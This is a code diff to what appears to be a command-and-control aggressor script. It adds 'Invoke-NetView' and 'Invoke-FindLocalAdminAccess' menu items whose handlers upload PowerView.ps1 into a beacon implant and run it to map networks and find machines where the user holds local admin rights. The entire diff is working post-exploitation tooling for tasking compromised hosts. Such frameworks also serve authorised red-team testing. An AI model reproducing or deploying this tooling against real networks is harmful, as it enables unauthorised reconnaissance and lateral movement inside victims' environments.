@@ -139,6 +139,14 @@ popup host_bottom {
                     $beaconID = %beaconHosts[$address];
                     wmi_dialog($beaconID);
                 }
+                item "Invoke-NetView" {
+                    $beaconID = %beaconHosts[$address];
+                    task_netview($beaconID);
+                }
+                item "Invoke-FindLocalAdminAccess"{
+                    $beaconID = %beaconHosts[$address];
+                    task_localadmin($beaconID);                    
+                }
             }
 
             item "Interact" {
@@ -537,6 +545,7 @@ sub executeWMI {
 }
 
 
+# other powershell imports/functionality
 sub task_powerup {
 
     $beacon_id = $1;
@@ -558,6 +567,52 @@ sub task_powerup {
 
     # actually task the beacon
     task_powershell($beacon_id, "Invoke-AllChecks");
+}
+
+sub task_netview {
+
+    $beacon_id = $1;
+
+    if (-exists script_resource("/beacon/PowerView.ps1")){
+       $script_source = script_resource("/beacon/PowerView.ps1");
+    }
+    else{
+        $script_source = script_resource("PowerView.ps1");
+    }
+
+    # get all of our data that we're going to upload
+    $handle = openf($script_source);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # task the beacon to import the powershell data
+    task_powershell_import($beacon_id, $data);
+
+    # actually task the beacon
+    task_powershell($beacon_id, "Invoke-Netview");
+}
+
+sub task_localadmin {
+
+    $beacon_id = $1;
+
+    if (-exists script_resource("/beacon/PowerView.ps1")){
+       $script_source = script_resource("/beacon/PowerView.ps1");
+    }
+    else{
+        $script_source = script_resource("PowerView.ps1");
+    }
+
+    # get all of our data that we're going to upload
+    $handle = openf($script_source);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # task the beacon to import the powershell data
+    task_powershell_import($beacon_id, $data);
+
+    # actually task the beacon
+    task_powershell($beacon_id, "Invoke-FindLocalAdminAccess");
 }
 
 
